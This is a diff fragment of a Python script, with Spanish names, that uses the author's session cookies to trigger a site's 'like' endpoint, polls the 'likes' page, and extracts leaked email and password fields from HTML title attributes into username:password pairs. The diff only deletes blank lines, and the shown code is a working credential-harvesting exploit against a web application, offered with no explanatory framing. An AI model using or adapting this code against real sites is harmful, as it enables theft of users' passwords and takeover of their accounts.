@@ -13,8 +13,6 @@ MIS_COOKIES = {
 def extraer_con_reintento(identificador):
     
     requests.get(f"{URL_BASE}/like/{identificador}", cookies=MIS_COOKIES)
-    
-    
     res = requests.get(f"{URL_BASE}/likes/{identificador}", cookies=MIS_COOKIES)
     
    
@@ -23,14 +21,12 @@ def extraer_con_reintento(identificador):
         time.sleep(0.2) 
         res = requests.get(f"{URL_BASE}/likes/{identificador}", cookies=MIS_COOKIES)
 
-    
     titulos = re.findall(r'title="([^"]*)"', res.text)
     if not titulos: return []
 
     texto_limpio = html.unescape(titulos[-1])
     emails = re.findall(r"'email': '([^']*)'", texto_limpio)
     passwords = re.findall(r"'password': '([^']*)'", texto_limpio)
-    
     return [f"{e.split('@')[0]}:{p}" for e, p in zip(emails, passwords)]
 
 def main():
